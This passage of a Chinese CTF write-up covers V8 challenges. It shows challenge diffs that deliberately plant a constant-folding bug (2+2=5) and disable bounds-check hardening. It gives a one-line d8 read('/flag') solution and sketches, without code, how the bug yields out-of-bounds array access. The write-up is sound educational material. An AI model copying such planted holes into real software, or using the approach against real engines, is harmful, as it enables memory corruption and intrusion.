style="color:#DBD7CAEE">   if </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">m.IsFoldable</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><span style="color:#DBD7CAEE">  // K + K =</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> K  </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">K stands for arbitrary constants</span><span style="color:#d4976c">)</span><br><span style="color:#DBD7CAEE">     return ReplaceInt32</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">base::AddWithWraparound</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">m.left</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">.ResolvedValue</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">,</span><br><span style="color:#DBD7CAEE">                                                 m.right</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">.ResolvedValue</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#79B8FF">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span><br><span style="color:#DBD7CAEE">index 4cc858bb22c..1e0056e7130 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/compiler/simplified-lowering.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/compiler/simplified-lowering.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -1993,7 +1993,7 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> class RepresentationSelector </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">             // The bounds check is redundant if we already know that</span><br><span style="color:#DBD7CAEE">             // the index is within the bounds of </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">0.0, length</span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">.</span><br><span style="color:#DBD7CAEE">             // TODO</span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">neis</span><span style="color:#6394bf">)</span><span style="color:#DBD7CAEE">: Move this into TypedOptimization?</span><br><span style="color:#FDAEB7">-            if </span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">v8_flags.turbo_typer_hardening</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#85E89D">+            if </span><span style="color:#5eaab5">(</span><span style="color:#85E89D">v8_flags.turbo_typer_hardening &#x26;&#x26; 2 + 2 == 5</span><span style="color:#5eaab5">)</span><span style="color:#85E89D"> </span><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span style="color:#DBD7CAEE">             </span><span style="color:#5eaab5">}</span><span style="color:#DBD7CAEE"> else </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">               DeferReplacement</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">node, NodeProperties::GetValueInput</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">node, 0</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br></code></pre></div>
<p>发现出题人没有禁用 v8 常用的系统函数，检查 dockerfile 发现 flag 的名称也是已知的，那么直接打就行：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#B07D48">console</span><span style="color:#999999">.</span><span style="color:#59873A">log</span><span style="color:#2993a3">(</span><span style="color:#59873A">read</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/flag</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#BD976A">console</span><span style="color:#666666">.</span><span style="color:#80A665">log</span><span style="color:#5eaab5">(</span><span style="color:#80A665">read</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/flag</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<h2 id="literally-1985" class="scroll-target"><a href="#literally-1985"><code class="hash inline-code">#</code>literally-1985</a></h2>
<p><del>v8 不会....</del></p>
<p><del>呜呜呜 什么时候才能学会 v8</del></p>
<p>真学会了，喵喵咪咪。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-diff language-diff"><span style="color:#005CC5">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#393A34">index 2da3715a58f..e6896555188 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -1101,6 +1101,11 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> Reduction MachineOperatorReducer::ReduceInt32Add</span><span style="color:#2993a3">(</span><span style="color:#393A34">Node* node</span><span style="color:#2993a3">)</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">   DCHECK_EQ</span><span style="color:#1e754f">(</span><span style="color:#393A34">IrOpcode::kInt32Add, node-</span><span style="color:#393A34">></span><span style="color:#393A34">opcode</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   Int32BinopMatcher m</span><span style="color:#1e754f">(</span><span style="color:#393A34">node</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   if </span><span style="color:#1e754f">(</span><span style="color:#393A34">m.right</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#393A34">.Is</span><span style="color:#a65e2b">(</span><span style="color:#393A34">0</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34"> return Replace</span><span style="color:#1e754f">(</span><span style="color:#393A34">m.left</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#393A34">.node</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34">;  // x + 0 =</span><span style="color:#393A34">></span><span style="color:#393A34"> x</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+  if </span><span style="color:#1e754f">(</span><span style="color:#22863A">m.left</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#22863A">.Is</span><span style="color:#a65e2b">(</span><span style="color:#22863A">2</span><span style="color:#a65e2b">)</span><span style="color:#22863A"> &#x26;&#x26; m.right</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#22863A">.Is</span><span style="color:#a65e2b">(</span><span style="color:#22863A">2</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#22863A"> </span><span style="color:#1e754f">{</span><br><span style="color:#22863A">+    return ReplaceInt32</span><span style="color:#a65e2b">(</span><span style="color:#22863A">5</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  </span><span style="color:#1e754f">}</span><br><span style="color:#22863A">+</span><br><span style="color:#393A34">   if </span><span style="color:#1e754f">(</span><span style="color:#393A34">m.IsFoldable</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><span style="color:#393A34">  // K + K =</span><span style="color:#393A34">></span><span style="color:#393A34"> K  </span><span style="color:#a65e2b">(</span><span style="color:#393A34">K stands for arbitrary constants</span><span style="color:#a65e2b">)</span><br><span style="color:#393A34">     return ReplaceInt32</span><span style="color:#a65e2b">(</span><span style="color:#393A34">base::AddWithWraparound</span><span style="color:#a13865">(</span><span style="color:#393A34">m.left</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#393A34">.ResolvedValue</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#393A34">,</span><br><span style="color:#393A34">                                                 m.right</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#393A34">.ResolvedValue</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#393A34">;</span><br><span style="color:#005CC5">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span><br><span style="color:#393A34">index 4cc858bb22c..1e0056e7130 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/compiler/simplified-lowering.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/compiler/simplified-lowering.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -1993,7 +1993,7 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> class RepresentationSelector </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">             // The bounds check is redundant if we already know that</span><br><span style="color:#393A34">             // the index is within the bounds of </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">0.0, length</span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">.</span><br><span style="color:#393A34">             // TODO</span><span style="color:#296aa3">(</span><span style="color:#393A34">neis</span><span style="color:#296aa3">)</span><span style="color:#393A34">: Move this into TypedOptimization?</span><br><span style="color:#B31D28">-            if </span><span style="color:#296aa3">(</span><span style="color:#B31D28">v8_flags.turbo_typer_hardening</span><span style="color:#296aa3">)</span><span style="color:#B31D28"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#22863A">+            if </span><span style="color:#2993a3">(</span><span style="color:#22863A">v8_flags.turbo_typer_hardening &#x26;&#x26; 2 + 2 == 5</span><span style="color:#2993a3">)</span><span style="color:#22863A"> </span><span style="color:#2993a3">{</span><br><span style="color:#393A34">               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span style="color:#393A34">             </span><span style="color:#2993a3">}</span><span style="color:#393A34"> else </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">               DeferReplacement</span><span style="color:#1e754f">(</span><span style="color:#393A34">node, NodeProperties::GetValueInput</span><span style="color:#a65e2b">(</span><span style="color:#393A34">node, 0</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#005CC5">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span style="color:#393A34">index 24fe0b6056e..6362b213a82 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/d8/d8.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/d8/d8.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -3829,6 +3829,7 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">FunctionTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> Shell::CreateNodeTemplates</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><br><br><span style="color:#393A34"> Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">ObjectTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> Shell::CreateGlobalTemplate</span><span style="color:#a65e2b">(</span><span style="color:#393A34">Isolate* isolate</span><span style="color:#a65e2b">)</span><span style="color:#393A34"> </span><span style="color:#a65e2b">{</span><br><span style="color:#393A34">   Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">ObjectTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> global_template = ObjectTemplate::New</span><span style="color:#a13865">(</span><span style="color:#393A34">isolate</span><span style="color:#a13865">)</span><span style="color:#393A34">;</span><br><span style="color:#22863A">+  /*</span><br><span style="color:#393A34">   global_template-</span><span style="color:#393A34">></span><span style="color:#393A34">Set</span><span style="color:#a13865">(</span><span style="color:#393A34">Symbol::GetToStringTag</span><span style="color:#bda437">(</span><span style="color:#393A34">isolate</span><span style="color:#bda437">)</span><span style="color:#393A34">,</span><br><span style="color:#393A34">                        String::NewFromUtf8Literal</span><span style="color:#bda437">(</span><span style="color:#393A34">isolate, "global"</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   global_template-</span><span style="color:#393A34">></span><span style="color:#393A34">Set</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><span style="color:#393A34">isolate, "version",</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -3876,6 +3877,7 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> Local</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">ObjectTemplate</span><span style="color:#393A34">></span><span style="color:#393A34"> Shell::CreateGlobalTemplate</span><span style="color:#bda437">(</span><span style="color:#393A34">Isolate* isolate</span><span style="color:#bda437">)</span><span style="color:#393A34"> </span><span style="color:#bda437">{</span><br><span style="color:#393A34">     global_template-</span><span style="color:#393A34">></span><span style="color:#393A34">Set</span><span style="color:#296aa3">(</span><span style="color:#393A34">isolate, "async_hooks",</span><br><span style="color:#393A34">                          Shell::CreateAsyncHookTemplate</span><span style="color:#2993a3">(</span><span style="color:#393A34">isolate</span><span style="color:#2993a3">)</span><span style="color:#296aa3">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   </span><span style="color:#bda437">}</span><br><span style="color:#22863A">+  */</span><br><br><span style="color:#393A34">   return global_template;</span><br><span style="color:#393A34"> </span><span style="color:#a65e2b">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-diff language-diff"><span style="color:#79B8FF">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#DBD7CAEE">index 2da3715a58f..e6896555188 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -1101,6 +1101,11 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> Reduction MachineOperatorReducer::ReduceInt32Add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">Node* node</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">   DCHECK_EQ</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">IrOpcode::kInt32Add, node-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">opcode</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   Int32BinopMatcher m</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">node</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   if </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">m.right</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">.Is</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">0</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> return Replace</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">m.left</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">.node</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;  // x + 0 =</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> x</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+  if </span><span style="color:#4d9375">(</span><span style="color:#85E89D">m.left</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#85E89D">.Is</span><span style="color:#d4976c">(</span><span style="color:#85E89D">2</span><span style="color:#d4976c">)</span><span style="color:#85E89D"> &#x26;&#x26; m.right</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#85E89D">.Is</span><span style="color:#d4976c">(</span><span style="color:#85E89D">2</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#85E89D"> </span><span style="color:#4d9375">{</span><br><span style="color:#85E89D">+    return ReplaceInt32</span><span style="color:#d4976c">(</span><span style="color:#85E89D">5</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  </span><span style="color:#4d9375">}</span><br><span style="color:#85E89D">+</span><br><span style="color:#DBD7CAEE">   if </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">m.IsFoldable</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><span style="color:#DBD7CAEE">  // K + K =</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> K  </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">K stands for arbitrary constants</span><span style="color:#d4976c">)</span><br><span style="color:#DBD7CAEE">     return ReplaceInt32</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">base::AddWithWraparound</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">m.left</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">.ResolvedValue</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">,</span><br><span style="color:#DBD7CAEE">                                                 m.right</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">.ResolvedValue</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#79B8FF">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span><br><span style="color:#DBD7CAEE">index 4cc858bb22c..1e0056e7130 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/compiler/simplified-lowering.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/compiler/simplified-lowering.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -1993,7 +1993,7 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> class RepresentationSelector </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">             // The bounds check is redundant if we already know that</span><br><span style="color:#DBD7CAEE">             // the index is within the bounds of </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">0.0, length</span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">.</span><br><span style="color:#DBD7CAEE">             // TODO</span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">neis</span><span style="color:#6394bf">)</span><span style="color:#DBD7CAEE">: Move this into TypedOptimization?</span><br><span style="color:#FDAEB7">-            if </span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">v8_flags.turbo_typer_hardening</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#85E89D">+            if </span><span style="color:#5eaab5">(</span><span style="color:#85E89D">v8_flags.turbo_typer_hardening &#x26;&#x26; 2 + 2 == 5</span><span style="color:#5eaab5">)</span><span style="color:#85E89D"> </span><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span style="color:#DBD7CAEE">             </span><span style="color:#5eaab5">}</span><span style="color:#DBD7CAEE"> else </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">               DeferReplacement</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">node, NodeProperties::GetValueInput</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">node, 0</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#79B8FF">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span style="color:#DBD7CAEE">index 24fe0b6056e..6362b213a82 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/d8/d8.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/d8/d8.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -3829,6 +3829,7 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">FunctionTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> Shell::CreateNodeTemplates</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><br><br><span style="color:#DBD7CAEE"> Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">ObjectTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> Shell::CreateGlobalTemplate</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">Isolate* isolate</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE"> </span><span style="color:#d4976c">{</span><br><span style="color:#DBD7CAEE">   Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">ObjectTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> global_template = ObjectTemplate::New</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">isolate</span><span style="color:#d9739f">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#85E89D">+  /*</span><br><span style="color:#DBD7CAEE">   global_template-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">Set</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Symbol::GetToStringTag</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">isolate</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">,</span><br><span style="color:#DBD7CAEE">                        String::NewFromUtf8Literal</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">isolate, "global"</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   global_template-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">Set</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><span style="color:#DBD7CAEE">isolate, "version",</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -3876,6 +3877,7 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">ObjectTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> Shell::CreateGlobalTemplate</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">Isolate* isolate</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE"> </span><span style="color:#e6cc77">{</span><br><span style="color:#DBD7CAEE">     global_template-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">Set</span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">isolate, "async_hooks",</span><br><span style="color:#DBD7CAEE">                          Shell::CreateAsyncHookTemplate</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">isolate</span><span style="color:#5eaab5">)</span><span style="color:#6394bf">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   </span><span style="color:#e6cc77">}</span><br><span style="color:#85E89D">+  */</span><br><br><span style="color:#DBD7CAEE">   return global_template;</span><br><span style="color:#DBD7CAEE"> </span><span style="color:#d4976c">}</span><br></code></pre></div>
<p>出题人禁用了系统函数，这次应该是要打正常的 oob 了。</p>
<p>分析一下 diff 文件，发现出题人在优化编译器上增加了攻击面，复习一下知识点：</p>
<p>为了平衡启动速度和运行效率，V8 执行 JavaScript 代码分为几个层次：</p>
<ol>
<li>解释器：当一段 JS 代码首次执行时，为了能快速启动，V8 会先用 Ignition 解释器来逐行执行。</li>
<li>优化编译器：V8 的运行时会监控代码的执行情况。如果它发现某一个函数被频繁地、重复地调用（我们称之为“热”代码，Hot Code），V8 就会认为这个函数值得花时间去优化。这时，它会把这个函数交给 TurboFan。</li>
</ol>
<p>因此为了触发这个 bug，需要写一个包含 <code class="inline-code">2 + 2</code> 的函数，并把它强制变热来看到效果。</p>
<p>另外这个 <code class="inline-code">2 + 2 = 5</code> 是可以绕过 OOB 检测的，就可以通过修改 JSArray 的 length 字段，拿到一个几乎可以无限读写的数组，</p>
<p><del>编译器 TurboFan</del></p>
<p>还没写完，咕咕....</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>